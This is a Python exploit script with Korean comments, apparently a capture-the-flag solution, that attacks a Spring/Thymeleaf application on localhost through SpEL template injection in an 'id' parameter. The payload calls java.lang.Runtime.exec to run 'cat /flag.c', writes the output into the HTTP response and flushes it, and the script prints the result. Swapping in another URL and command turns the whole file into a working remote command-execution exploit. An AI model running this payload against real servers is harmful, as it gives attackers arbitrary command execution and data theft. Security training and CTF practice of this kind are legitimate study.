import requests
import urllib.parse

target_url = "http://localhost:8080/user"

# 실행할 쉘 명령어 (문제의 목표인 /flag.c 읽기)
command = "cat /flag.c"

# 1. 명령어 실행 및 결과 읽기 (Java 8 호환 - Scanner 활용)
# T(java.lang.Runtime).getRuntime().exec('...') 의 결과를 InputStream으로 받아 Scanner로 전체 문자열 변환
exec_and_read_spel = f"new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('{command}').getInputStream()).useDelimiter('\\A').next()"

# 2. HTTP Response 객체에 접근하여 결과 쓰기
print_spel = f"T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().getWriter().print({exec_and_read_spel})"

# 3. HTTP Response 버퍼 강제 전송 (Commit)
flush_spel = "T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().getWriter().flush()"

# 4. 페이로드 결합 (두 개의 SpEL 구문을 연달아 실행)
# 형태: __${print_spel}__::__${flush_spel}__::.x
payload = f"__${{{print_spel}}}__::__${{{flush_spel}}}__::.x"

# URL 인코딩 처리
encoded_payload = urllib.parse.quote(payload)
request_url = f"{target_url}?id={encoded_payload}"

print("="*60)
print("[DEBUG] 1. Request Information")
print("="*60)
print(f"[*] Target URL : {request_url}")
print(f"[*] Command    : {command}")
print(f"[*] Payload    : \n{payload}")
print(f"[*] Encoded    : \n{encoded_payload}")
print("-" * 60)

try:
    print("\n[DEBUG] 2. Sending Request...")
    # 응답이 도중에 끊기거나 예외가 발생하더라도 flush()된 데이터를 얻기 위해 타임아웃 넉넉히 설정
    response = requests.get(request_url, timeout=10)
    
    print("\n" + "="*60)
    print("[DEBUG] 3. Response Information")
    print("="*60)
    print(f"[*] Status Code : {response.status_code}")
    print("[*] Headers     :")
    for key, value in response.headers.items():
        print(f"    - {key}: {value}")
    
    print("\n[DEBUG] === [ Extracted Data / Command Output ] ===")
    # flush()로 인해 우리가 print한 내용(명령어 결과)이 출력됩니다.
    # 스프링 에러 스택 트레이스나 HTML이 뒤에 섞여 나올 수 있으므로 raw text 전체를 출력합니다.
    print(response.text)
    print("===================================================\n")

except requests.exceptions.RequestException as e:
    print(f"\n[ERROR] Request failed: {e}")

print("[INFO] Script Finished.")